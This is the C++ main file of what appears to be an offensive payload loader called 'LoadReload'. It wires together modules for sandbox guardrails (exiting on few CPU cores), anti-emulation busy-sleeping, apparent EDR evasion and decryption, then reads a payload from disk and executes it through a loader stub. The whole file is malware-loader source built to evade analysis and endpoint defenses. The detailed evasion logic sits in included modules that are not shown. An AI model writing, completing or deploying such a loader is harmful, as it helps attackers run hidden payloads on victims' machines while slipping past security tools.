#include <windows.h>
#include <vector>
#include "../config.h"

// Modules
#include "../modules/guardrails.h"
#include "../modules/anti_emulation.h"
#include "../modules/edr_decon.h"
#include "../modules/decryptor.h"
#include "../modules/loader_stub.h"
#include "../utils/logging.h"



int main() {

    Log::Write(Log::LogLevel::Msg, "Starting LoadReload...");
    
    // Timestamp of execution start


	// Execution Guardrails Module
#if USE_GUARDRAILS
    if (Guardrails::CheckCpuCores(2)) {
        Log::Write(Log::LogLevel::Msg, "Guardrails: Insufficient CPU cores detected. Exiting.");
        ExitProcess(-1);
	}
#endif

	// Anti-emulation Module
	// If config.h isn’t included before the #if, then USE_ANTI_EMULATION is undefined preprocessor treats it as 0. therefore #if defined(...) && ... is needed
#if defined(USE_ANTI_EMULATION) && USE_ANTI_EMULATION
	// Anti-emulation checks because they didnt work with namespace
    Log::Write(Log::LogLevel::Msg, "BusySleep Starting...");
    BusySleepMs(5000); // Sleep for 5 seconds to avoid emulation detection
#endif

	// Load payload
#if LOAD_FROM_DISK
    auto payload = LoaderStub::LoadBinaryFile(PAYLOAD_PATH);
#endif

    if (payload.empty()) {
        Log::Write(Log::LogLevel::Msg, "Failed to load payload");
        ExitProcess(-1);
    }
    // Execution via Loader Stub
    LoaderStub::Execute(payload);

    return 0;
}
